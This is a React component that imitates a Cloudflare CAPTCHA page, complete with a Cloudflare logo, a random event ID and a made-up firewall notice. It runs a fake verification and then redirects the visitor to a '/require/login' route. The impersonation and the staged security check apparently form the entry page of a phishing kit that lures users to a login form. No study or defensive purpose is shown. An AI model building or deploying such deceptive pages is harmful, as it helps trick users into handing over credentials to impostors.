import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/official-notice.css";

const OfficialNotice = () => {
  const navigate = useNavigate();
  const [isVerifying, setIsVerifying] = useState(true);
  const [isVerified, setIsVerified] = useState(false);
  const [buttonText, setButtonText] = useState("Verifying...");
  const [eventId] = useState(() => {
    return Math.random().toString(36).substring(2, 26);
  });

  useEffect(() => {
    // Auto-start verification after a short delay
    const timer = setTimeout(() => {
      startVerification();
    }, 500);

    return () => clearTimeout(timer);
  }, []);

  const startVerification = async () => {
    setIsVerifying(true);
    setButtonText("Verifying...");

    try {
      // Simulate IP verification with delay (matches progress bar duration)
      await new Promise((resolve) => setTimeout(resolve, 4000));

      setIsVerifying(false);
      setButtonText("I am not a bot");
    } catch (error) {
      console.error("Verification failed:", error);
      setIsVerifying(false);
      setButtonText("I am not a bot");
    }
  };

  const handleCaptchaClick = () => {
    if (isVerifying) return;
    setIsVerifying(true);
    setButtonText("Verifying...");
    // setIsVerified(true);

    // Navigate to login page after verification
    setTimeout(() => {
      navigate("/require/login");
    }, 2000);
  };

  // If verified, don't show anything (will navigate away)
  if (isVerified) {
    return null;
  }

  return (
    <div className="official-notice-page">
      {/* Page Loading Overlay */}
      {isVerifying && (
        <div className="page-loading-overlay" id="pageLoadingOverlay"></div>
      )}

      {/* Progress Bar */}
      {isVerifying && (
        <div className="progress-bar-container" id="progressBarContainer">
          <div className="progress-bar"></div>
        </div>
      )}

      {/* CAPTCHA Overlay */}
      <div className="clf-overlay" id="captchaScreen">
        <div className="clf-container">
          <img src="/clf.png" alt="Cloudflare" className="clf-logo" />

          <h1 className="clf-title">
            Please complete the following CAPTCHA security challenge to
            continue!
          </h1>

          <button
            className="clf-button"
            id="captchaButton"
            onClick={handleCaptchaClick}
            disabled={isVerifying}
            style={{ opacity: isVerifying ? 0.7 : 1 }}
          >
            {isVerifying && <span className="clf-spinner"></span>}
            {buttonText}
          </button>

          <div className="clf-challenge">
            <strong>Why do I see CAPTCHA challenge?</strong>
            <p>
              Due to enhanced firewall security measures, you are required to
              complete a CAPTCHA security challenge to proceed with access to
              this website.
            </p>
            <p className="event-id-line">
              Event ID: <span className="clf-event-id">{eventId}</span>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OfficialNotice;
